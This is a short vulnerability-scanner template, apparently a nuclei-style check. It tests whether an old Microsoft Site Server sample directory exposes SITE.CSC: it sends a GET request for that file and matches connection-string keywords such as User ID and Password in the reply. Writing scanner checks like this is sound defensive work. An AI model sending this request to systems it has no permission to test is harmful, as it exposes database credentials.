[info]
author = "ave"
description = "检测 Microsoft Site Server Commerce Edition 3.0 alpha AdSamples 目录下的 SITE.CSC 敏感配置文件泄露，该文件包含 SQL 数据库连接敏感信息"
id = "POC-AVE-1999-1157"
name = "CVE-1999-1520 PoC"
severity = "medium"
tags = ["ave-1999-1157"]
vuln_id = [
    "CVE-1999-1520",
    "AVE-1999-1157",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/AdSamples/SITE.CSC"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Data Source=",
    "Initial Catalog=",
    "User ID=",
    "Password=",
]

